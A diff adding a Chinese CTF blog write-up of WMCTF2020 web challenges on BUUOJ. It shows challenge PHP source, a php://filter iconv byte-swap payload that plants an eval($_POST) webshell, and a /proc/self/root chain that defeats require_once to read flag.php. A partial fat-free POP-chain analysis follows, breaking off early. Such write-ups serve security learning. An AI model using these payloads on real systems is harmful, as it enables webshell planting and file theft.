@@ -1,0 +1,1052 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
+    <meta charset="UTF-8" />
+
+    <meta name="generator" content="Hugo 0.83.1" /><meta name="theme-color" content="#fff" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
+    
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+
+    <title>[BUUOJ]2021第一弹 | tyskillのBlog</title>
+
+    <link rel="stylesheet" href="/css/meme.min.7a71afbedd186ffaac4ba8190cf1910f0bcf15bc9124e380c6446e6257dfb04d.css"/>
+
+    
+    
+        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" media="print" onload="this.media='all'" />
+        <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" /></noscript>
+
+    <meta name="author" content="tyskill" /><meta name="description" content="[WMCTF2020]Check in&amp;2.0 我记得当时好像是1出了非预期所以出了2，现在BUU上的1已经修了非预期，所以1和……" />
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="#2a6df4" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-title" content="tyskillのBlog" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="application-name" content="tyskillのBlog" />
+    <meta name="msapplication-starturl" content="../../" />
+    <meta name="msapplication-TileColor" content="#fff" />
+    <meta name="msapplication-TileImage" content="../../icons/mstile-150x150.png" />
+    <link rel="manifest" href="/manifest.json" />
+
+    
+    
+
+    
+    <link rel="canonical" href="https://tyskill.github.io/posts/buuoj_21_1/" />
+    
+
+<script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "datePublished": "2021-04-10T00:00:00+00:00",
+        "dateModified": "2021-04-13T00:00:00+00:00",
+        "url": "https://tyskill.github.io/posts/buuoj_21_1/",
+        "headline": "[BUUOJ]2021第一弹",
+        "description": "[WMCTF2020]Check in\u00262.0 我记得当时好像是1出了非预期所以出了2，现在BUU上的1已经修了非预期，所以1和……",
+        "inLanguage" : "zh-CN",
+        "articleSection": "posts",
+        "wordCount":  2247 ,
+        "image": "https://tyskill.github.io/icons/icon.jpg",
+        "author": {
+            "@type": "Person",
+            "email": "tyskill@foxmail.com",
+            "image": "https://tyskill.github.io/icons/icon.jpg",
+            "url": "https://tyskill.github.io",
+            "name": "tyskill"
+        },
+        "license": "[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)",
+        "publisher": {
+            "@type": "Organization",
+            "name": "tyskillのBlog",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https://tyskill.github.io/icons/icon.jpg"
+            },
+            "url": "https://tyskill.github.io/"
+        },
+        "mainEntityOfPage": {
+            "@type": "WebSite",
+            "@id": "https://tyskill.github.io/"
+        }
+    }
+</script>
+
+    
+
+<meta name="twitter:card" content="summary" />
+
+
+    
+
+
+
+<meta property="og:title" content="[BUUOJ]2021第一弹" />
+<meta property="og:description" content="[WMCTF2020]Check in&amp;2.0 我记得当时好像是1出了非预期所以出了2，现在BUU上的1已经修了非预期，所以1和……" />
+<meta property="og:url" content="https://tyskill.github.io/posts/buuoj_21_1/" />
+<meta property="og:site_name" content="tyskillのBlog" />
+<meta property="og:locale" content="zh" /><meta property="og:image" content="https://tyskill.github.io/icons/icon.jpg" />
+    <meta property="og:type" content="article" />
+    <meta property="article:published_time" content="2021-04-10T00:00:00&#43;00:00" />
+    <meta property="article:modified_time" content="2021-04-13T00:00:00&#43;00:00" />
+    
+    <meta property="article:section" content="posts" />
+
+
+
+    
+    
+
+    
+</head>
+
+    <body>
+        <div class="container">
+            
+    <header class="header">
+        
+            <div class="header-wrapper">
+                <div class="header-inner single">
+                    
+    <div class="site-brand">
+        
+            <a href="/" class="brand">tyskillのBlog</a>
+        
+    </div>
+
+                    <nav class="nav">
+    <ul class="menu" id="menu">
+        
+            
+        
+        
+        
+        
+            
+                <li class="menu-item"><a href="/"><span class="menu-item-name">首页</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/posts/"><span class="menu-item-name">文章</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/categories/"><span class="menu-item-name">分类</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/tags/"><span class="menu-item-name">标签</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/about/"><span class="menu-item-name">关于</span></a>
+                </li>
+            
+        
+            
+                
+                    
+                    
+                        <li class="menu-item">
+                            <a id="theme-switcher" href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon theme-icon-light"><path d="M193.2 104.5l48.8-97.5a18 18 0 0128 0l48.8 97.5 103.4 -34.5a18 18 0 0119.8 19.8l-34.5 103.4l97.5 48.8a18 18 0 010 28l-97.5 48.8 34.5 103.4a18 18 0 01-19.8 19.8l-103.4-34.5-48.8 97.5a18 18 0 01-28 0l-48.8-97.5l-103.4 34.5a18 18 0 01-19.8-19.8l34.5-103.4-97.5-48.8a18 18 0 010-28l97.5-48.8-34.5-103.4a18 18 0 0119.8-19.8zM256 128a128 128 0 10.01 0M256 160a96 96 0 10.01 0"/></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon theme-icon-dark"><path d="M27 412a256 256 0 10154-407a11.5 11.5 0 00-5 20a201.5 201.5 0 01-134 374a11.5 11.5 0 00-15 13"/></svg></a>
+                        </li>
+                    
+                
+            
+        
+            
+                
+            
+        
+            
+                
+            
+        
+    </ul>
+</nav>
+
+                    
+                </div>
+            </div>
+            
+    <input type="checkbox" id="nav-toggle" aria-hidden="true" />
+    <label for="nav-toggle" class="nav-toggle"></label>
+    <label for="nav-toggle" class="nav-curtain"></label>
+
+
+        
+    </header>
+
+
+
+
+            
+            
+    <main class="main single" id="main">
+    <div class="main-inner">
+
+        
+
+        <article class="content post h-entry" data-align="justify" data-type="posts" data-toc-num="true">
+
+            <h1 class="post-title p-name">[BUUOJ]2021第一弹</h1>
+
+            
+
+            
+                
+            
+
+            
+                
+
+<div class="post-meta">
+    
+        
+        <time datetime="2021-04-10T00:00:00&#43;00:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M148 288h-40c-6.6 0-12-5.4-12-12v-40c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12zm108-12v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm-96 96v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm-96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm192 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm96-260v352c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V112c0-26.5 21.5-48 48-48h48V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h128V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h48c26.5 0 48 21.5 48 48zm-48 346V160H48v298c0 3.3 2.7 6 6 6h340c3.3 0 6-2.7 6-6z"/></svg>&nbsp;2021.4.10</time>
+    
+    
+        
+        <time datetime="2021-04-13T00:00:00&#43;00:00" class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2021.4.13</time>
+    
+    
+    
+        
+        
+        
+            
+                <span class="post-meta-item category"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M464 128H272l-54.63-54.63c-6-6-14.14-9.37-22.63-9.37H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V176c0-26.51-21.49-48-48-48zm0 272H48V112h140.12l54.63 54.63c6 6 14.14 9.37 22.63 9.37H464v224z"/></svg>&nbsp;<a href="/categories/ctf/" class="category-link p-category">CTF</a></span>
+            
+        
+    
+    
+        
+        <span class="post-meta-item wordcount"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>&nbsp;2247</span>
+    
+    
+        
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;5&nbsp;分钟</span>
+    
+    
+    
+</div>
+
+            
+
+            <nav class="contents">
+  <h2 id="contents" class="contents-title">目录</h2><ol class="toc">
+    <li><a id="contents:wmctf2020check-in20" href="#wmctf2020check-in20">[WMCTF2020]Check in&amp;2.0</a></li>
+    <li><a id="contents:wmctf2020make-php-great-again20" href="#wmctf2020make-php-great-again20">[WMCTF2020]Make PHP Great Again&amp;2.0</a></li>
+    <li><a id="contents:wmctf2020webcheckinwebweb" href="#wmctf2020webcheckinwebweb">[WMCTF2020]webcheckin/webweb</a>
+      <ol>
+        <li><a id="contents:方法一一叶飘零" href="#方法一一叶飘零">方法一(一叶飘零)</a></li>
+        <li><a id="contents:方法二官方" href="#方法二官方">方法二(官方)</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:网鼎杯-2020-半决赛babyjs" href="#网鼎杯-2020-半决赛babyjs">[网鼎杯 2020 半决赛]BabyJS</a></li>
+  </ol>
+</nav><div class="post-body e-content">
+              <h2 id="wmctf2020check-in20"><a href="#wmctf2020check-in20" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:wmctf2020check-in20" class="headings">[WMCTF2020]Check in&amp;2.0</a></h2>
+<p>我记得当时好像是1出了非预期所以出了2，现在BUU上的1已经修了非预期，所以1和2应该是一样的。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="c1">//PHP 7.0.33 Apache/2.4.25
+</span><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nv">$sandbox</span> <span class="o">=</span> <span class="s1">&#39;/var/www/html/sandbox/&#39;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]);</span>
+<span class="o">@</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
+<span class="o">@</span><span class="nx">chdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
+<span class="nx">var_dump</span><span class="p">(</span><span class="s2">&#34;Sandbox:&#34;</span><span class="o">.</span><span class="nv">$sandbox</span><span class="p">);</span>
+<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/iconv|UCS|UTF|rot|quoted|base64/i&#39;</span><span class="p">,</span><span class="nv">$content</span><span class="p">))</span>
+         <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$content</span><span class="p">))</span>
+        <span class="k">require_once</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>
+    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;&lt;?php exit();&#39;</span><span class="o">.</span><span class="nv">$content</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>payload</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="c1">//convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|x&lt;ap?ph@ vela$(P_SO[Tytksli]l;)&gt;?/resource=tyskill.php
+</span></code></pre></td></tr></table></div>
+</div>
+</div><h2 id="wmctf2020make-php-great-again20"><a href="#wmctf2020make-php-great-again20" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:wmctf2020make-php-great-again20" class="headings">[WMCTF2020]Make PHP Great Again&amp;2.0</a></h2>
+<blockquote>
+<p>参考：</p>
+<p><a href="https://www.anquanke.com/post/id/213235" target="_blank" rel="noopener">php源码分析 require_once 绕过不能重复包含文件的限制</a></p>
+</blockquote>
+<p>require_once包含较多的符号链接时路径的哈希表匹配会失效</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">?</span><span class="nx">file</span><span class="o">=</span><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="nx">flag</span><span class="o">.</span><span class="nx">php</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h2 id="wmctf2020webcheckinwebweb"><a href="#wmctf2020webcheckinwebweb" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:wmctf2020webcheckinwebweb" class="headings">[WMCTF2020]webcheckin/webweb</a></h2>
+<blockquote>
+<p>参考：</p>
+<p><a href="https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF%202020%E5%AE%98%E6%96%B9WriteUp.md" target="_blank" rel="noopener">WMCTF 2020官方WriteUp</a>
+<a href="https://blog.init-new-world.com/post/BUUOJ-Web-ti-mu-13.html#toc-138" target="_blank" rel="noopener">webcheckin</a>
+<a href="https://xz.aliyun.com/t/9220" target="_blank" rel="noopener">从WMCTF2020 webweb学反序列化</a>
+<a href="https://www.4hou.com/posts/vD7X" target="_blank" rel="noopener">2020 WMCTF Web Writeup</a></p>
+</blockquote>
+<p><code>www.zip</code>源码泄露，可知是fat-free框架，版本是<strong>3.7.2</strong>。对比源码，发现只是删除了一些析构函数的代码，并没有添加什么内容，不过这也算提示了吧。看过wp，已知是框架找POP链，就不去搞php原生类了。</p>
+<h3 id="方法一一叶飘零"><a href="#方法一一叶飘零" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:方法一一叶飘零" class="headings">方法一(一叶飘零)</a></h3>
+<p>先从入口函数<code>__destruct</code>找起，只有ws.php中<code>CLI\Agent</code>里面存在有内容的析构函数(其他有内容的析构函数都被清空了)</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="o">-&gt;</span><span class="na">events</span><span class="p">[</span><span class="s1">&#39;disconnect&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span>
+        <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$func</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="o">-&gt;</span><span class="na">events</span><span class="p">[</span><span class="s1">&#39;disconnect&#39;</span><span class="p">]))</span>
+        <span class="nv">$func</span><span class="p">(</span><span class="nv">$this</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>可以看到这里使用<code>$this-&gt;server-&gt;events['disconnect']</code>并判断函数是否可调用，很明显，即使$func可以任意污染，它最终还是要在Agent作用域内执行，它的参数固定为了Agent且Agent没有<code>__toString</code>方法也表明了这里没办法实现任意命令执行。</p>
